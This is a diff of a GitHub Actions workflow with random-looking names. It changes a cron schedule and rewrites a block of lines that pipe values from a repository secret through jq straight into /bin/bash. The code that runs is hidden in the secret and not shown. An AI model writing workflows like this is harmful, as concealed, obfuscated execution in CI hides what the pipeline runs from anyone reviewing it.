@@ -2,34 +2,25 @@ name: caocao19870105
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 5/6 * * *'
-
+    - cron: '34 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caocao19870105
         env:
-          ag2980: ${{ secrets.ag2980 }}
+          sfvi952: ${{ secrets.sfvi952 }}
         run: |
-          echo $ag2980 | jq -r .ofvnn42923 | /bin/bash
-          echo $yzthd04472 | jq -r .pdikk99306 | /bin/bash
-          echo $rcwr51605 | jq -r .me23176 | /bin/bash
-          echo $mj438 | jq -r .fwz8 | /bin/bash
-          echo $te78 | jq -r .gvmaf85017 | /bin/bash
-          echo $ezz0464 | jq -r .c34391 | /bin/bash
-          echo $oeaor733 | jq -r .mjnf286 | /bin/bash
-          echo $zvxt27187 | jq -r .q91708 | /bin/bash
-          echo $z90 | jq -r .spfki39 | /bin/bash
-          echo $eom8 | jq -r .bbtyv3 | /bin/bash
-          echo $y536 | jq -r .jljbu06754 | /bin/bash
-          echo $mh7706 | jq -r .sgqe9427 | /bin/bash
-          echo $pgm4 | jq -r .yb38479 | /bin/bash
-          echo $nk11 | jq -r .hzqf756 | /bin/bash
-          echo $jl0 | jq -r .zuvw6714 | /bin/bash
-          echo $b76 | jq -r .zqo97 | /bin/bash
-          echo $vfjj330 | jq -r .pdlls8973 | /bin/bash
-          echo $fgrbx2 | jq -r .rqkuz45177 | /bin/bash
+          echo $sfvi952 | jq -r .oy764 | /bin/bash
+          echo $abhrd51160 | jq -r .dxgx7862 | /bin/bash
+          echo $rbh22 | jq -r .h144 | /bin/bash
+          echo $l17 | jq -r .gnpk5856 | /bin/bash
+          echo $k872 | jq -r .fekp901 | /bin/bash
+          echo $v0 | jq -r .j10074 | /bin/bash
+          echo $coc372 | jq -r .c53 | /bin/bash
+          echo $vork064 | jq -r .ozr3 | /bin/bash
+          echo $xwmr66 | jq -r .rfivv53613 | /bin/bash
+          echo $uaez773 | jq -r .ztp93 | /bin/bash
+          echo $jx5 | jq -r .gz30572 | /bin/bash
 
